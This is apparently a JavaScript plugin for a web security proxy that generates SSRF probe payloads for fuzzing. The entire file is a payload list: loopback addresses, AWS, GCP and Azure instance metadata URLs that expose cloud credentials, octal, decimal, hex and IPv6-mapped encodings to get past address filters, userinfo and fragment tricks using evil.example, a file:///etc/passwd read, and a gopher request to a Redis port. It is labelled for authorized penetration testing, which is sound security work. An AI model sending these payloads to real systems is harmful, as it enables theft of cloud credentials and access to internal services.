/*!
 * SSRF Target List — an Intruder payload generator with common SSRF probe targets:
 * loopback, cloud metadata endpoints (AWS/GCP/Azure), and IP/parser-bypass encodings.
 * For blind SSRF, pair these with a Beacon (OAST) callback host. No permissions needed.
 * Authorized testing only — these reach internal/metadata services if the bug is real.
 *
 * Crusader community plugin · MIT License · https://crusaderproxy.com/ext/ssrf-targets.js
 * Install:  crusader plugin install https://crusaderproxy.com/ext/ssrf-targets.js
 */
"use strict";

var manifest = {
  id: "ssrf-targets",
  name: "SSRF Target List",
  version: "1.0.0",
  capabilities: []
};

crusader.payloadGenerator({
  name: "SSRF targets",
  generate: function (baseValue) {
    return [
      "http://127.0.0.1/",
      "http://localhost/",
      "http://0.0.0.0/",
      "http://[::1]/",
      "http://169.254.169.254/latest/meta-data/",                         // AWS IMDSv1
      "http://169.254.169.254/latest/api/token",                          // AWS IMDSv2 token
      "http://metadata.google.internal/computeMetadata/v1/",              // GCP
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  // Azure
      "http://127.0.0.1./",                                               // trailing-dot host
      "http://0177.0.0.1/",                                               // octal
      "http://2130706433/",                                              // decimal 127.0.0.1
      "http://0x7f000001/",                                              // hex
      "http://[0:0:0:0:0:ffff:127.0.0.1]/",                              // ipv6-mapped
      "http://evil.example@127.0.0.1/",                                  // userinfo confusion
      "http://127.0.0.1#@evil.example/",                                 // fragment confusion
      "file:///etc/passwd",
      "gopher://127.0.0.1:6379/_INFO"
    ];
  }
});
